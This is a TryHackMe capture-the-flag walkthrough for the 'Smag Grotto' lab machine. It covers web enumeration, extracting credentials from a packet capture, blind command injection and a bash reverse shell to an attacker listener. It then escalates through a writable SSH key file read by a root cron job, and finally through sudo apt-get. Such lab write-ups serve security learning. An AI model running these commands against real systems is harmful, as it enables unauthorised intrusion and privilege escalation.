# Try Hack Me - Smag Grotto
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities:

# Reconnaisance:

nmap scan:
```bash
nmap -sC -sV <target_ip>
```

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

the main page tells us that the site is still under development, so we fuzz the directories using gobuster to find any secret or hidden directories

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```
/.hta                 (Status: 403) [Size: 278]

/.htpasswd            (Status: 403) [Size: 278]

/.htaccess            (Status: 403) [Size: 278]

/index.php            (Status: 200) [Size: 402]

/mail                 (Status: 301) [Size: 313] [--> http://10.81.167.135/mail/]                                                                    

/server-status        (Status: 403) [Size: 278]

lets access the /mail directory to get some leads

we find some emails from the employees to the admin and vice versa, we can download a file named dHJhY2Uy.pcap, lets use wireshark to analyse these files

we right click on the 10th packet and then click on follow and then follow the tcp stream.
the process goes like RightClick>>Follow>>Follow TCP stream

we find some user credentials

username=helpdesk&password=cH4nG3M3_n0w

using these credentials we try to access the ssh shell
using strings command we find the host name and the subdomain name
```bash
strings dHJhY2Uy.pcap
```
<eU@

4eV@

POST /login.php HTTP/1.1

Host: development.smag.thm

User-Agent: curl/7.47.0

Accept: */*

Content-Length: 39

Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0w

HTTP/1.1 200 OK

Date: Wed, 03 Jun 2020 18:04:07 GMT

Server: Apache/2.4.18 (Ubuntu)

Content-Length: 0

Content-Type: text/html; charset=UTF-8

4eX@
4eY@
4eZ@

we add the subdomain in our /etc/hosts file and then access the page

```bash
echo "<target_ip development.smag.thm>" | sudo tee -a /etc/hosts
```

now we find three directories on the subdomain and then we access the login.php and enter the credentials. we can carry out RCE through the command field. but wait, it is a blind command input field and we cannot see the outputs with normal commands, maybe there could be some sanitization to these commands. there was no sanitization for the commands

after entering some commands into it we found out it is a Blind RCE vulnerability

you can verify it yourselves by submitting this command

# Privilege Escalation (A):
```bash
sleep 5 
```
the browser will buffer for exactly 5 seconds which means it is carrying out the command execution, but it just does not display the output

# Shell as www-data:
let us upload a simple bash reverseshell on it

```bash
#first setup a listener in another terminal
nc -lnvp 4444
```

```bash
#now upload this payload into the command field
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
```

boom! we have a reverse shell as www-data. we quickly transfer linpeas.sh on the target machine and then wait for the results

we find a cronjob running every minute and looks like we can easily exploit it.

*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
           
# Shell as jake:

this is the cronjob, we can clearly see that the public key in jake's directory is getting overwritten by the backup of the public key present in the /opt/.backups directory. lets check the permissions of the .backups directory

```bash 
ls -la /opt/.backups
```
total 12
drwxr-xr-x 2 root root 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup

this is some good news, it means anyone can write this file. this is a huge vulnerability. now we simply create our own personal public and private key pair using sshkey-gen
```bash
ssh-keygen -t rsa -f my_key
```
now we will have two files named my_key and my_key.pub. we copy the contents of the my_key.pub and past it into the jake_id_rsa.pub.backup at the /opt/.backups directory.

```bash
cat my_key.pub
#copy all the content 
```
```bash
#now paste everything into the file
echo "<contents_of_my_key.pub>" > /opt/.backups/jake_id_rsa.pub.backup
```

now lets confirm using the cat command if the copy past is successful or no. turns out we have done it! now lets use the my_key (private key) to access the ssh shell of jake

```bash
ssh -i my_key jake@<taget_ip>
```
we have a shell as jake! lets keep enumerating further and find an attack vector which we can uset to escalate privileges

# Privilege Escalation (B):

```bash
sudo -l
```
User jake may run the following commands on smag:
   
 (ALL : ALL) NOPASSWD: /usr/bin/apt-get

we hit a JACKPOT! this is an easy SUDO exploit. lets search apt-get on GTFObins and just blindly enter the commands

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

on entering this command, we get 

jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root

hehehehawww! we have a root shell. now we can read and submit the root.txt flag


